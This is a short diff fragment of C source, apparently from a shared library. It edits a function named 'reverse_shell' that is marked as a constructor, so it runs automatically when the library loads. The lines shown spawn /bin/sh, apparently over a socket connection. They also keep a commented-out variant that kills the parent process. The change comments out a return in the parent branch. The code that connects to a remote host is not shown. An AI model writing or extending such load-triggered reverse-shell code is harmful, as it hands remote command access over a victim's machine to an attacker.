@@ -30,7 +30,7 @@ void __attribute__((constructor)) reverse_shell(){
     execl("/bin/sh", "/bin/sh", NULL);
 	  //"-c", "kill -9 $(($$ - 1));/bin/sh", NULL);
   }else{
-    return;
+    //return;
     wait(NULL);
     close(connection_fd);
     close(socket_fd);
